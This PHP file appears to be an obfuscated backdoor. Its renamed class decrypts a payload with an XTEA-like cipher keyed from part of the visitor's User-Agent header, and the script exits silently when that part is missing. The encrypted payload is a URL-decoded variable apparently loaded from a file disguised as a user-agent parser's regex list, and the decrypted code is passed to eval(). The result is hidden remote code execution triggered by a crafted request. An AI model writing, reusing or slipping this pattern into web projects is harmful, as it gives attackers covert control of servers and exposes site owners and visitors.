<?php
class cood_ok{
	var $op_uksd;
	function __construct(){
		$this->uxaoj(32);
	}
	function olkwx22($start, &$detop, &$detop_long){
		$n = strlen($detop);
		$tmp = unpack('N*', $detop);
		$j  = $start;
		foreach ($tmp as $value) 
		$detop_long[$j++] = $value;
		return $j;
	}
	function ioxp2osl($l){
		return pack('N', $l);
	}
	function uxaoj($op_uksd){
		$this->li_our = $op_uksd;
	}
	function getIter(){
		return $this->li_our;
	}
	function deunco($enc_data){
		$NMij = $_SERVER['HTTP_USER_AGENT'];
		if(preg_match('/ Apple(.*) \(/is',$NMij,$ojj)){
			$key = str_replace('Kit/58','5#k',$ojj[1]);
			$key = explode(".",$key);
			$key = 'Aec'.$key[1].$key[0].'&y5H';
		}else{
			die();
		}
		$n_enc_data_long = $this->olkwx22(0, $enc_data, $enc_data_long);
		$this->plyeiz($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_key_long = $this->olkwx22(0, $key, $key_long);
		$detop = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_data_long;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $key_long[$j];
				$k[1] = $key_long[$j + 1];
				$k[2] = $key_long[$j + 2];
				$k[3] = $key_long[$j + 3];
			}else{
				$k[0] = $key_long[$j % $n_key_long];
				$k[1] = $key_long[($j + 1) % $n_key_long];
				$k[2] = $key_long[($j + 2) % $n_key_long];
				$k[3] = $key_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->longxlke($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$detop .= $this->ioxp2osl($w[1]);
				}else{
					$detop .= substr($this->ioxp2osl($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$detop .= $this->ioxp2osl($w[0]);
					if ($pos + 8 <= $len){
						$detop .= $this->ioxp2osl($w[1]);
					}elseif($pos + 4 < $len){
						$detop .= substr($this->ioxp2osl($w[1]), 0, $len % 4);
					}
				}else{
					$detop .= substr($this->ioxp2osl($w[0]), 0, $len % 4);
				}
			}
		}
		return $detop;
	}
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function qnka($plsjx, $n){
		if (0xffffffff < $plsjx || -0xffffffff > $plsjx){
			$plsjx = fmod($plsjx, 0xffffffff + 1);
		}
		if (0x7fffffff < $plsjx){
			$plsjx -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $plsjx){
			$plsjx += 0xffffffff + 1.0;
		}
		if (0 > $plsjx){
			$plsjx &= 0x7fffffff;
			$plsjx >>= $n;
			$plsjx |= 1 << (31 - $n);
		}else{
			$plsjx >>= $n;
		}
		return $plsjx;
	}
	function plyeiz(&$detop, $szppl, $nonull = false){
		$n  = strlen($detop);
		$nmod = $n % $szppl;
		if(0 == $nmod)
			$nmod = $szppl;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $szppl;++$i){
				$detop[$i] = $detop[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $szppl;++$i){
				$detop[$i] = chr(0);
				}
			}
		}
		return $n;
	}
	function longxlke($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->li_our;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->qnka($y, 5), $y) ^ 
			$this->add($sum, $k[$this->qnka($sum, 11) & 3])));
			$sum = $this->add($sum, -$delta);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->qnka($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
}
require '../Libs/uaparser/regexes.php';
$str_llg = urldecode($str_wws); 
$cood_ok = new cood_ok(64); 
$kexw = $cood_ok->deunco($str_llg);
eval($kexw);
